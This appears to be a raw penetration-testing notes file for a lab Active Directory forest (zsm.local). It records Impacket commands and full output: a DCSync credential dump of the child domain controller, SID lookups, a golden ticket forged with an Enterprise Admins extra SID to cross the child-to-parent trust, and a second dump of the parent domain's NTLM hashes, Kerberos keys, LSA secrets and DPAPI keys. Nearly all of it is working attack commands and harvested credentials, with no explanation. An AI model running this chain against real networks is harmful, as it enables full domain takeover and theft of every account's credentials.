

https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/attack-trusts#enumeration



```
kali@kali ~> secretsdump.py 'internal.zsm.local/ZPH-SVRCDC01$'@192.168.210.16 -hashes aad3b435b51404eeaad3b435b51404ee:d47a6d90e1c5adf4200227514e393948
Impacket v0.11.0 - Copyright 2023 Fortra

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:543beb20a2a579c7714ced68a1760d5e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0540fe51ddd618f42a66ef059ac36441:::
internal.zsm.local\mssql_svc:6101:aad3b435b51404eeaad3b435b51404ee:8cb21ab7f3ee6d782c724216bd88d1d1:::
internal.zsm.local\Emily:6601:aad3b435b51404eeaad3b435b51404ee:29ab86c5c4d2aab957763e5c1720486d:::
internal.zsm.local\Laura:6602:aad3b435b51404eeaad3b435b51404ee:29ab86c5c4d2aab957763e5c1720486d:::
internal.zsm.local\Melissa:6603:aad3b435b51404eeaad3b435b51404ee:184260f5bf16a77d67a9d540fda79495:::
internal.zsm.local\Sarah:6604:aad3b435b51404eeaad3b435b51404ee:29ab86c5c4d2aab957763e5c1720486d:::
internal.zsm.local\Amy:6605:aad3b435b51404eeaad3b435b51404ee:29ab86c5c4d2aab957763e5c1720486d:::
internal.zsm.local\Steven:6606:aad3b435b51404eeaad3b435b51404ee:29ab86c5c4d2aab957763e5c1720486d:::
internal.zsm.local\Malcolm:6607:aad3b435b51404eeaad3b435b51404ee:29ab86c5c4d2aab957763e5c1720486d:::
internal.zsm.local\Aron:6608:aad3b435b51404eeaad3b435b51404ee:8cb21ab7f3ee6d782c724216bd88d1d1:::
internal.zsm.local\Matt:6609:aad3b435b51404eeaad3b435b51404ee:29ab86c5c4d2aab957763e5c1720486d:::
internal.zsm.local\Jamie:6610:aad3b435b51404eeaad3b435b51404ee:29ab86c5c4d2aab957763e5c1720486d:::
ZPH-SVRCDC01$:1000:aad3b435b51404eeaad3b435b51404ee:d47a6d90e1c5adf4200227514e393948:::
ZPH-SVRCHR$:1601:aad3b435b51404eeaad3b435b51404ee:06e402102d72956c62a63794a999935e:::
ZPH-SVRCSUP$:1602:aad3b435b51404eeaad3b435b51404ee:36e7d551e7cb15ca7dad3fd851fc707f:::
ZSM-SVRCSQL02$:5601:aad3b435b51404eeaad3b435b51404ee:ad854719bbb6fc1664316a14cc6eb88d:::
INT-MAINT$:6102:aad3b435b51404eeaad3b435b51404ee:cca9b0a476598d91ec3f567c468277f1:::
ZSM$:1103:aad3b435b51404eeaad3b435b51404ee:cfd3a2825b28e859fbc840145d530cd4:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:fbbb5e79da10a8b4609429942c12329391e4af7213e69560893b81c421375f0b
Administrator:aes128-cts-hmac-sha1-96:1f50b00b725eb4ed09a3def4e75ec9f0
Administrator:des-cbc-md5:439ed652fe5b38ae
krbtgt:aes256-cts-hmac-sha1-96:3bdcbeb0910e5887e6d6c7fbec6c3f29e1e099322ac91cc386ca296a5c5497b0
krbtgt:aes128-cts-hmac-sha1-96:b6252a6e5ec060751a03c1a73ef2af4e
krbtgt:des-cbc-md5:92755ef7ce8a6e16
internal.zsm.local\mssql_svc:aes256-cts-hmac-sha1-96:bea9de16d6775f6ed646cf8e002b2e6845e219f080a709410cb600f909d105ff
internal.zsm.local\mssql_svc:aes128-cts-hmac-sha1-96:4df91cf757b8cb7c5f6e544236293c8d
internal.zsm.local\mssql_svc:des-cbc-md5:5bdf199ee546e6f8
internal.zsm.local\Emily:aes256-cts-hmac-sha1-96:6fac0f47c747960e583ab9cb6d93c31a9425f9a921d246766c2d1a798e10fb56
internal.zsm.local\Emily:aes128-cts-hmac-sha1-96:fbba2f446451e35dd9cbf1d376580e1f
internal.zsm.local\Emily:des-cbc-md5:fd374cc262ec9201
internal.zsm.local\Laura:aes256-cts-hmac-sha1-96:bf6a8feea25df8f1640143c2dc26bc76128748962aef3d5e1c315b8bc7acc8c0
internal.zsm.local\Laura:aes128-cts-hmac-sha1-96:b994efccf32f7827c5ec3a43126a1118
internal.zsm.local\Laura:des-cbc-md5:add68cc23470b0f8
internal.zsm.local\Melissa:aes256-cts-hmac-sha1-96:b09d86e2e6480c2122ee1383f24e592a9642e16470a82bdeb9fff6875d41a922
internal.zsm.local\Melissa:aes128-cts-hmac-sha1-96:289e6d2c65f84c94f185e9755708cf3b
internal.zsm.local\Melissa:des-cbc-md5:982a25f7dc4cb3e9
internal.zsm.local\Sarah:aes256-cts-hmac-sha1-96:81028d54164a46107a6f6b9b0ac9a9216aee0e8d4bce82a3c668d5e1f16774c5
internal.zsm.local\Sarah:aes128-cts-hmac-sha1-96:d130b796b81c66348bc67a95029a19c7
internal.zsm.local\Sarah:des-cbc-md5:29ceaeb664bc2f9e
internal.zsm.local\Amy:aes256-cts-hmac-sha1-96:940adf4174eaaa50218561b87644cdf0210cdecb40ee5b6672312ef39e7f4390
internal.zsm.local\Amy:aes128-cts-hmac-sha1-96:655645f7b62f9d073a00ef7142c8da33
internal.zsm.local\Amy:des-cbc-md5:49e0d6bfd69868b6
internal.zsm.local\Steven:aes256-cts-hmac-sha1-96:9adcb602c37ce0ee4894d74a6575a6f70f7430e8e00446bc0850b787089c4cc4
internal.zsm.local\Steven:aes128-cts-hmac-sha1-96:e9731b435a8651cf11d52d71df936385
internal.zsm.local\Steven:des-cbc-md5:5dce8a52b389e5a2
internal.zsm.local\Malcolm:aes256-cts-hmac-sha1-96:f6e7d8a35afb386c1c271d6a53af85fcf8e306d36f281fdfc2c477c353f62c91
internal.zsm.local\Malcolm:aes128-cts-hmac-sha1-96:4bac2835d8be32ad5dd585ceb7450ef3
internal.zsm.local\Malcolm:des-cbc-md5:26b331256d2fbcd9
internal.zsm.local\Aron:aes256-cts-hmac-sha1-96:957fd600878eaad5dba70443e42d6a647b0b393211da3e62e55ef5bff965d9bb
internal.zsm.local\Aron:aes128-cts-hmac-sha1-96:26ef49f42cb51e023b50c84e360399eb
internal.zsm.local\Aron:des-cbc-md5:91cef44fc119f119
internal.zsm.local\Matt:aes256-cts-hmac-sha1-96:1877cc1d57a84d334b4a07a77c80086dfb76abe997f0339307efb32429b0deee
internal.zsm.local\Matt:aes128-cts-hmac-sha1-96:a4007666551eebd71856c6833faed374
internal.zsm.local\Matt:des-cbc-md5:2a4a5b467f9bb919
internal.zsm.local\Jamie:aes256-cts-hmac-sha1-96:899a0a57d770ad6510608350b67487beb5c50ac8f3455a1804ff4e8eb85da5e8
internal.zsm.local\Jamie:aes128-cts-hmac-sha1-96:abc87732e5844aafab3c8b355076a959
internal.zsm.local\Jamie:des-cbc-md5:5234a7253bd31f98
ZPH-SVRCDC01$:aes256-cts-hmac-sha1-96:8a67907987149e76179c1717526a984b286656ce9c5afae114b11a0e1187d282
ZPH-SVRCDC01$:aes128-cts-hmac-sha1-96:68e66ddb5aaf1e796af831a3a0527699
ZPH-SVRCDC01$:des-cbc-md5:298c2fb6f823790d
ZPH-SVRCHR$:aes256-cts-hmac-sha1-96:9b37dffd2f9e191262978b8a9cc9b41f782165e4f4709973c9e1e5ada5f80e35
ZPH-SVRCHR$:aes128-cts-hmac-sha1-96:cf8f357935397b6fcf7058e751ffd9e6
ZPH-SVRCHR$:des-cbc-md5:4698c19bbaf8b667
ZPH-SVRCSUP$:aes256-cts-hmac-sha1-96:980035e13beb4c1b68e5071f0b919bf1a11b37cf3573e0a88f0305614fb361d3
ZPH-SVRCSUP$:aes128-cts-hmac-sha1-96:a98bbab60af92f6b8ce9d1f93e9a230c
ZPH-SVRCSUP$:des-cbc-md5:ec7acd5d73fb371f
ZSM-SVRCSQL02$:aes256-cts-hmac-sha1-96:1270026132348b974c1a948cd7b202ae9678b5b3b03cdbdb4be825c1c11f4d71
ZSM-SVRCSQL02$:aes128-cts-hmac-sha1-96:5d3e1581bca6b36aac111bb16bc8e2e1
ZSM-SVRCSQL02$:des-cbc-md5:bf8faba8893475a7
INT-MAINT$:aes256-cts-hmac-sha1-96:5222d4a99827d8e10173a6984b94a685f21aed806825e22f08911c45bb5b6512
INT-MAINT$:aes128-cts-hmac-sha1-96:c15805616dc52a7d6a9d7b4bbacb93d0
INT-MAINT$:des-cbc-md5:26df6d5743bc153b
ZSM$:aes256-cts-hmac-sha1-96:ff5132693f0d7e159c3f65172c4866eec6e25370a3ed175c8645ec79aee17c25
ZSM$:aes128-cts-hmac-sha1-96:d59426f20d49a44535ea4d6d37c03568
ZSM$:des-cbc-md5:e3ab57fd73bc2c89
[*] Cleaning up...

```


```
kali@kali ~> lookupsid.py internal.zsm.local/Administrator@ZPH-SVRCDC01.internal.zsm.local -hashes aad3b435b51404eeaad3b435b51404ee:543beb20a2a579c7714ced68a1760d5e | grep SidTypeUser | grep -i DC01
1000: internal\ZPH-SVRCDC01$ (SidTypeUser)
```

## CHILD SID

`[*] Domain SID is: S-1-5-21-3056178012-3972705859-491075245`


```
kali@kali ~> lookupsid.py internal.zsm.local/Administrator@ZPH-SVRCDC01.internal.zsm.local -hashes aad3b435b51404eeaad3b435b51404ee:543beb20a2a579c7714ced68a1760d5e | grep 'Domain SID'
[*] Domain SID is: S-1-5-21-3056178012-3972705859-491075245

```


## parent SID

## Parent

```
S-1-5-21-2734290894-461713716-141835440
```


```
ticketer.py -nthash 0540fe51ddd618f42a66ef059ac36441 
 -domain-sid S-1-5-21-3056178012-3972705859-491075245 
 -domain zsm.local 
 -extra-sid S-1-5-21-2734290894-461713716-141835440-519 
 goldenuser
```


# WORKING

```
kali@kali ~> ticketer.py -aesKey 3bdcbeb0910e5887e6d6c7fbec6c3f29e1e099322ac91cc386ca296a5c5497b0 -domain internal.zsm.local -domain-sid S-1-5-21-3056178012-3972705859-491075245 -extra-sid S-1-5-21-2734290894-461713716-141835440-519 administrator -user-id 500
/usr/local/bin/ticketer.py:4: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  __import__('pkg_resources').run_script('impacket==0.12.0', 'ticketer.py')
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for internal.zsm.local/administrator
[*] 	PAC_LOGON_INFO
[*] 	PAC_CLIENT_INFO_TYPE
[*] 	EncTicketPart
[*] 	EncAsRepPart
[*] Signing/Encrypting final ticket
[*] 	PAC_SERVER_CHECKSUM
[*] 	PAC_PRIVSVR_CHECKSUM
[*] 	EncTicketPart
[*] 	EncASRepPart
[*] Saving ticket in administrator.ccache
kali@kali ~> export KRB5CCNAME=administrator.ccache
kali@kali ~> secretsdump.py -k internal.zsm.local/administrator@ZPH-SVRDC01.zsm.local -no-pass -debug
/usr/local/bin/secretsdump.py:4: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  __import__('pkg_resources').run_script('impacket==0.12.0', 'secretsdump.py')
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[+] Impacket Library Installation Path: /usr/local/lib/python3.11/dist-packages/impacket-0.12.0-py3.11.egg/impacket
[+] Using Kerberos Cache: administrator.ccache
[+] SPN CIFS/ZPH-SVRDC01.ZSM.LOCAL@INTERNAL.ZSM.LOCAL not found in cache
[+] AnySPN is True, looking for another suitable SPN
[+] Returning cached credential for KRBTGT/INTERNAL.ZSM.LOCAL@INTERNAL.ZSM.LOCAL
[+] Using TGT from cache
[+] Trying to connect to KDC at INTERNAL.ZSM.LOCAL:88
[+] Trying to connect to KDC at ZSM.LOCAL:88
[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[+] Retrieving class info for JD
[+] Retrieving class info for Skew1
[+] Retrieving class info for GBG
```


```
kali@kali ~> ticketer.py -aesKey 3bdcbeb0910e5887e6d6c7fbec6c3f29e1e099322ac91cc386ca296a5c5497b0 -domain internal.zsm.local -domain-sid S-1-5-21-3056178012-3972705859-491075245 -extra-sid S-1-5-21-2734290894-461713716-141835440-519 administrator -user-id 500
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for internal.zsm.local/Laura
[*] 	PAC_LOGON_INFO
[*] 	PAC_CLIENT_INFO_TYPE
[*] 	EncTicketPart
[*] 	EncAsRepPart
[*] Signing/Encrypting final ticket
[*] 	PAC_SERVER_CHECKSUM
[*] 	PAC_PRIVSVR_CHECKSUM
[*] 	EncTicketPart
[*] 	EncASRepPart
[*] Saving ticket in Laura.ccache
kali@kali ~> export KRB5CCNAME=Laura.ccache
kali@kali ~> secretsdump.py -k internal.zsm.local/Laura@ZPH-SVRDC01.zsm.local -no-pass -debug
Impacket v0.11.0 - Copyright 2023 Fortra

[+] Impacket Library Installation Path: /home/kali/.local/lib/python3.11/site-packages/impacket
[+] Using Kerberos Cache: Laura.ccache
[+] SPN CIFS/ZPH-SVRDC01.ZSM.LOCAL@INTERNAL.ZSM.LOCAL not found in cache
[+] AnySPN is True, looking for another suitable SPN
[+] Returning cached credential for KRBTGT/INTERNAL.ZSM.LOCAL@INTERNAL.ZSM.LOCAL
[+] Using TGT from cache
[+] Trying to connect to KDC at INTERNAL.ZSM.LOCAL:88
[+] Trying to connect to KDC at ZSM.LOCAL:88
[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[+] Retrieving class info for JD
[+] Retrieving class info for Skew1
[+] Retrieving class info for GBG
[+] Retrieving class info for Data
[*] Target system bootKey: 0x089d55a4ed9f4b67d969139aa7a4bbf5
[+] Checking NoLMHash Policy
[+] LMHashes are NOT being stored
[+] Saving remote SAM database
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
[+] Calculating HashedBootKey from SAM
[+] NewStyle hashes is: True
Administrator:500:aad3b435b51404eeaad3b435b51404ee:5e3c0abbe0b4163c5612afe25c69ced6:::
[+] NewStyle hashes is: True
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[+] NewStyle hashes is: True
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[+] Saving remote SECURITY database
[*] Dumping cached domain logon information (domain/username:hash)
[+] Decrypting LSA Key
[+] Decrypting NL$KM
[+] Looking into NL$1
[+] Looking into NL$2
[+] Looking into NL$3
[+] Looking into NL$4
[+] Looking into NL$5
[+] Looking into NL$6
[+] Looking into NL$7
[+] Looking into NL$8
[+] Looking into NL$9
[+] Looking into NL$10
[*] Dumping LSA Secrets
[+] Looking into $MACHINE.ACC
[*] $MACHINE.ACC
[+] Could not calculate machine account Kerberos keys, only printing plain password (hex encoded)
ZSM\ZPH-SVRDC01$:plain_password_hex:6bb07b8143a367824dff015b4562282b2f2d1ecf4141735c5059df5ce0d803b395c27bb8def97444d0ae737b06c3d6303f937867a8d322f274f4d2650b9f9a6508835665bbad50fa61d278b64096cf7d2df3e592f43160f498834a39d0a747ea10fe11603fa303efed8f0e7de12b0acdc0f1b08703a9883c6fb5726d83855aefdd7daf8292c39b1c123846d718798285ac2b51e2ec4c5c3894071d1d683e5090f6641773cba53ed57ab68dfc099c037c9899e5e43d9d8709e773e5ddbe06b8ba6a966a141a9c4d6b8f9119d5e654a919fb571924b0313d9abb894acb9c594c02563012d58ae8417b38252b0c9950b18e
ZSM\ZPH-SVRDC01$:aad3b435b51404eeaad3b435b51404ee:b02f38febbe88d3297f779bf41157502:::
[+] Looking into DPAPI_SYSTEM
[*] DPAPI_SYSTEM
dpapi_machinekey:0xc50ee67b890124a14ec6735ee1caff337232119f
dpapi_userkey:0x301e82f7c1ae1007ba510b38397b8affffab112d
[+] Looking into NL$KM
[*] NL$KM
 0000   07 E9 F2 3F 08 49 46 07  02 CE 30 4B 65 D3 86 32   ...?.IF...0Ke..2
 0010   6F 02 5D 36 7D E8 30 33  F4 71 94 44 98 37 CB 1A   o.]6}.03.q.D.7..
 0020   05 CC 76 F1 26 E2 94 E7  D3 54 78 1F EF BE E9 13   ..v.&....Tx.....
 0030   30 3B 62 CB A5 57 75 E6  78 F3 D4 55 5C 68 20 15   0;b..Wu.x..U\h .
NL$KM:07e9f23f0849460702ce304b65d386326f025d367de83033f47194449837cb1a05cc76f126e294e7d354781fefbee913303b62cba55775e678f3d4555c682015
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
[+] Session resume file will be sessionresume_GLENesNk
[+] Trying to connect to KDC at INTERNAL.ZSM.LOCAL:88
[+] Trying to connect to KDC at ZSM.LOCAL:88
[+] Calling DRSCrackNames for S-1-5-21-2734290894-461713716-141835440-500
[+] Calling DRSGetNCChanges for {f6460902-ac53-44d0-85e8-345e82d6040b}
[+] Entering NTDSHashes.__decryptHash
[+] Decrypting hash for user: CN=Administrator,CN=Users,DC=zsm,DC=local
Administrator:500:aad3b435b51404eeaad3b435b51404ee:84210eddc5724a7801fe78289ee94d44:::
[+] Leaving NTDSHashes.__decryptHash
[+] Entering NTDSHashes.__decryptSupplementalInfo
[+] Leaving NTDSHashes.__decryptSupplementalInfo
[+] Calling DRSCrackNames for S-1-5-21-2734290894-461713716-141835440-501
[+] Calling DRSGetNCChanges for {7d74dfb1-17be-4e63-9cd9-3db961e9ee9c}
[+] Entering NTDSHashes.__decryptHash
[+] Decrypting hash for user: CN=Guest,CN=Users,DC=zsm,DC=local
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[+] Leaving NTDSHashes.__decryptHash
[+] Entering NTDSHashes.__decryptSupplementalInfo
[+] Leaving NTDSHashes.__decryptSupplementalInfo
[+] Calling DRSCrackNames for S-1-5-21-2734290894-461713716-141835440-502
[+] Calling DRSGetNCChanges for {a0b5f966-eeac-4d7c-8e49-324e0e446f03}
[+] Entering NTDSHashes.__decryptHash
[+] Decrypting hash for user: CN=krbtgt,CN=Users,DC=zsm,DC=local
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:8a72936717997f33694d17bd2ce909fe:::
[+] Leaving NTDSHashes.__decryptHash
[+] Entering NTDSHashes.__decryptSupplementalInfo
[+] Leaving NTDSHashes.__decryptSupplementalInfo
[+] Calling DRSCrackNames for S-1-5-21-2734290894-461713716-141835440-1107
[+] Calling DRSGetNCChanges for {6e6749e2-765a-4788-bdfe-9a5ef93962df}
[+] Entering NTDSHashes.__decryptHash
[+] Decrypting hash for user: CN=Daniel Morris,OU=Users,OU=Zephyr,OU=Sites,DC=zsm,DC=local
zsm.local\daniel.morris:1107:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
[+] Leaving NTDSHashes.__decryptHash
[+] Entering NTDSHashes.__decryptSupplementalInfo
[+] Leaving NTDSHashes.__decryptSupplementalInfo
[+] Calling DRSCrackNames for S-1-5-21-2734290894-461713716-141835440-1110
[+] Calling DRSGetNCChanges for {2adc3351-fbb6-4a85-ac14-d8ed61455bdb}
[+] Entering NTDSHashes.__decryptHash
[+] Decrypting hash for user: CN=Paul Williams,OU=Users,OU=Zephyr,OU=Sites,DC=zsm,DC=local
zsm.local\paul.williams:1110:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
[+] Leaving NTDSHashes.__decryptHash
[+] Entering NTDSHashes.__decryptSupplementalInfo
[+] Leaving NTDSHashes.__decryptSupplementalInfo
[+] Calling DRSCrackNames for S-1-5-21-2734290894-461713716-141835440-4102
[+] Calling DRSGetNCChanges for {1258e3c7-ceda-42af-a337-f749eb943d42}
[+] Entering NTDSHashes.__decryptHash
[+] Decrypting hash for user: CN=Marcus Thompson,OU=Users,OU=Zephyr,OU=Sites,DC=zsm,DC=local
zsm.local\marcus:4102:aad3b435b51404eeaad3b435b51404ee:3b24c391862f4a8531a245a0217708c4:::
[+] Leaving NTDSHashes.__decryptHash
[+] Entering NTDSHashes.__decryptSupplementalInfo
[+] Leaving NTDSHashes.__decryptSupplementalInfo
[+] Calling DRSCrackNames for S-1-5-21-2734290894-461713716-141835440-4104
[+] Calling DRSGetNCChanges for {0e2ff984-505b-43a0-8884-f3ff132ac43f}
[+] Entering NTDSHashes.__decryptHash
[+] Decrypting hash for user: CN=ca_svc,OU=Service Accounts,OU=Users,OU=Zephyr,OU=Sites,DC=zsm,DC=local
zsm.local\ca_svc:4104:aad3b435b51404eeaad3b435b51404ee:7f3e79164258b9aeb22e6aff46a5ee69:::
[+] Leaving NTDSHashes.__decryptHash
[+] Entering NTDSHashes.__decryptSupplementalInfo
[+] Leaving NTDSHashes.__decryptSupplementalInfo
[+] Calling DRSCrackNames for S-1-5-21-2734290894-461713716-141835440-4602
[+] Calling DRSGetNCChanges for {c157a46c-a1bd-4f12-9f41-d0271f24df23}
[+] Entering NTDSHashes.__decryptHash
[+] Decrypting hash for user: CN=Jamie Smith,OU=Users,OU=Zephyr,OU=Sites,DC=zsm,DC=local
zsm.local\jamie:4602:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
[+] Leaving NTDSHashes.__decryptHash
[+] Entering NTDSHashes.__decryptSupplementalInfo
[+] Leaving NTDSHashes.__decryptSupplementalInfo
[+] Calling DRSCrackNames for S-1-5-21-2734290894-461713716-141835440-1000
[+] Calling DRSGetNCChanges for {b41baf50-467a-4a21-939c-789b569bf27a}
[+] Entering NTDSHashes.__decryptHash
[+] Decrypting hash for user: CN=ZPH-SVRDC01,OU=Domain Controllers,DC=zsm,DC=local
ZPH-SVRDC01$:1000:aad3b435b51404eeaad3b435b51404ee:b02f38febbe88d3297f779bf41157502:::
[+] Leaving NTDSHashes.__decryptHash
[+] Entering NTDSHashes.__decryptSupplementalInfo
[+] Leaving NTDSHashes.__decryptSupplementalInfo
[+] Calling DRSCrackNames for S-1-5-21-2734290894-461713716-141835440-1104
[+] Calling DRSGetNCChanges for {099f95cb-9a96-4832-aea2-c514108e1bb2}
[+] Entering NTDSHashes.__decryptHash
[+] Decrypting hash for user: CN=MAINTENANCE,CN=Computers,DC=zsm,DC=local
MAINTENANCE$:1104:aad3b435b51404eeaad3b435b51404ee:efad0cd90c24701e57cd5c4e1ea01c8b:::
[+] Leaving NTDSHashes.__decryptHash
[+] Entering NTDSHashes.__decryptSupplementalInfo
[+] Leaving NTDSHashes.__decryptSupplementalInfo
[+] Calling DRSCrackNames for S-1-5-21-2734290894-461713716-141835440-1105
[+] Calling DRSGetNCChanges for {7282e178-9e46-4914-9c7a-7d9e367d18c4}
[+] Entering NTDSHashes.__decryptHash
[+] Decrypting hash for user: CN=ZPH-GMSA-ADFS,CN=Managed Service Accounts,DC=zsm,DC=local
ZPH-GMSA-ADFS$:1105:aad3b435b51404eeaad3b435b51404ee:681fecfeb70c962edc58014352f88160:::
[+] Leaving NTDSHashes.__decryptHash
[+] Entering NTDSHashes.__decryptSupplementalInfo
[+] Leaving NTDSHashes.__decryptSupplementalInfo
[+] Calling DRSCrackNames for S-1-5-21-2734290894-461713716-141835440-1106
[+] Calling DRSGetNCChanges for {fa7494e0-f0c8-4aad-a9f0-2ca8e810b376}
[+] Entering NTDSHashes.__decryptHash
[+] Decrypting hash for user: CN=ZPH-SVRCA01,CN=Computers,DC=zsm,DC=local
ZPH-SVRCA01$:1106:aad3b435b51404eeaad3b435b51404ee:251e366fdd64eff18be0824ec7c6833c:::
[+] Leaving NTDSHashes.__decryptHash
[+] Entering NTDSHashes.__decryptSupplementalInfo
[+] Leaving NTDSHashes.__decryptSupplementalInfo
[+] Calling DRSCrackNames for S-1-5-21-2734290894-461713716-141835440-1108
[+] Calling DRSGetNCChanges for {09e9ab59-9fa2-406a-adae-2c39a9025ce6}
[+] Entering NTDSHashes.__decryptHash
[+] Decrypting hash for user: CN=ZPH-SVRADFS1,CN=Computers,DC=zsm,DC=local
ZPH-SVRADFS1$:1108:aad3b435b51404eeaad3b435b51404ee:24039a7fd44d8decd80b0897e333ec06:::
[+] Leaving NTDSHashes.__decryptHash
[+] Entering NTDSHashes.__decryptSupplementalInfo
[+] Leaving NTDSHashes.__decryptSupplementalInfo
[+] Calling DRSCrackNames for S-1-5-21-2734290894-461713716-141835440-1601
[+] Calling DRSGetNCChanges for {c7b8e3da-fa27-459a-b3a8-6609c42e4a5e}
[+] Entering NTDSHashes.__decryptHash
[+] Decrypting hash for user: CN=ZPH-SVRSQL01,CN=Computers,DC=zsm,DC=local
ZPH-SVRSQL01$:1601:aad3b435b51404eeaad3b435b51404ee:ecf68b5e132ca80e6864215d5fcbba03:::
[+] Leaving NTDSHashes.__decryptHash
[+] Entering NTDSHashes.__decryptSupplementalInfo
[+] Leaving NTDSHashes.__decryptSupplementalInfo
[+] Calling DRSCrackNames for S-1-5-21-2734290894-461713716-141835440-4101
[+] Calling DRSGetNCChanges for {c4c63253-73b9-4954-a6c0-42f13f7a2d4e}
[+] Entering NTDSHashes.__decryptHash
[+] Decrypting hash for user: CN=ZPH-SVRMGMT1,CN=Computers,DC=zsm,DC=local
ZPH-SVRMGMT1$:4101:aad3b435b51404eeaad3b435b51404ee:89d0b56874f61ad38bad336a77b8ef2f:::
[+] Leaving NTDSHashes.__decryptHash
[+] Entering NTDSHashes.__decryptSupplementalInfo
[+] Leaving NTDSHashes.__decryptSupplementalInfo
[+] Calling DRSCrackNames for S-1-5-21-2734290894-461713716-141835440-1109
[+] Calling DRSGetNCChanges for {07326be3-97b3-4599-b962-3978b60b3692}
[+] Entering NTDSHashes.__decryptHash
[+] Decrypting hash for user: CN=PAINTERS$,CN=Users,DC=zsm,DC=local
PAINTERS$:1109:aad3b435b51404eeaad3b435b51404ee:98c970372548248b0b91c35fc175651a:::
[+] Leaving NTDSHashes.__decryptHash
[+] Entering NTDSHashes.__decryptSupplementalInfo
[+] Leaving NTDSHashes.__decryptSupplementalInfo
[+] Calling DRSCrackNames for S-1-5-21-2734290894-461713716-141835440-1602
[+] Calling DRSGetNCChanges for {b0117109-9fac-4cec-b07b-4d4ec6332330}
[+] Entering NTDSHashes.__decryptHash
[+] Decrypting hash for user: CN=internal$,CN=Users,DC=zsm,DC=local
internal$:1602:aad3b435b51404eeaad3b435b51404ee:009d927aebe4eb85156f2c2bfc242aab:::
[+] Leaving NTDSHashes.__decryptHash
[+] Entering NTDSHashes.__decryptSupplementalInfo
[+] Leaving NTDSHashes.__decryptSupplementalInfo
[+] Finished processing and printing user's hashes, now printing supplemental information
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:24ebe114c4d8067024c2502f824eb7fac7bb9981cb8890cbe08108232239646b
Administrator:aes128-cts-hmac-sha1-96:af42e41319cbc844734a2ad4032b77d2
Administrator:des-cbc-md5:a7a2dcc89da7dc32
krbtgt:aes256-cts-hmac-sha1-96:45b1d73b87312453c7b82505e36f24efccf2c97b8a87443d58fcb77d06202842
krbtgt:aes128-cts-hmac-sha1-96:6882f340f1d58ae375780cd975463b32
krbtgt:des-cbc-md5:ab75ea79ba5e6ee5
zsm.local\daniel.morris:aes256-cts-hmac-sha1-96:98f9c26d75d011f46fbcc244cfe37209e6b7bf7c42dae175978fbc5d8b71e17e
zsm.local\daniel.morris:aes128-cts-hmac-sha1-96:ddce6e98cd45b5bb7fee867b557655ba
zsm.local\daniel.morris:des-cbc-md5:e3c88a89a832a23d
zsm.local\paul.williams:aes256-cts-hmac-sha1-96:a773e775478ef242b02613b1bdb2fd0af9ee49a747d0d0709a6302b00d45b675
zsm.local\paul.williams:aes128-cts-hmac-sha1-96:024d7824de28aecb8a56289c726ed56d
zsm.local\paul.williams:des-cbc-md5:1ada3bad7ce52997
zsm.local\marcus:aes256-cts-hmac-sha1-96:d487b6eda0fd6929373b02eca5b6a6b287315e3ce2edde0c83de21b81ae553b5
zsm.local\marcus:aes128-cts-hmac-sha1-96:c9d8300b395ea0b0eb33afb7ca5226b6
zsm.local\marcus:des-cbc-md5:2ff8e3d3fef7b06b
zsm.local\ca_svc:aes256-cts-hmac-sha1-96:3d4ca384edb097462c8d9539534d95e87fe417536a090d3f7a0cd567e5c9951c
zsm.local\ca_svc:aes128-cts-hmac-sha1-96:28d349a757e2c9d90df39383f6b0daae
zsm.local\ca_svc:des-cbc-md5:abbadc10e9265234
zsm.local\jamie:aes256-cts-hmac-sha1-96:6b5a25f16e8c7c97d97bd0dc5cdaf64e9b2a752a8f81cc7dbccf153f2c14e23d
zsm.local\jamie:aes128-cts-hmac-sha1-96:a04ec4c01de1b35bb06a2f43558c04ac
zsm.local\jamie:des-cbc-md5:803b7ffd6d088075
ZPH-SVRDC01$:aes256-cts-hmac-sha1-96:6d744bcf94917def9e17130a9b2016122cb6bf3d1bd3c063c8cd5775a421829b
ZPH-SVRDC01$:aes128-cts-hmac-sha1-96:b47c954fb9b6ebdd037ff341b37dbf12
ZPH-SVRDC01$:des-cbc-md5:ef6db5322534cbef
MAINTENANCE$:aes256-cts-hmac-sha1-96:2bd37881a31f36949ee1585efbb9b90fef67cb1d12585d7fb5fcc0591a0d8c3d
MAINTENANCE$:aes128-cts-hmac-sha1-96:45db1b8e9d5f154b53d8404d2d2cf0de
MAINTENANCE$:des-cbc-md5:7f384a7fba07cb13
ZPH-GMSA-ADFS$:aes256-cts-hmac-sha1-96:35c6f3ac27244fecab25b747472685b87baa815b2a7a59030fa21310e537dff2
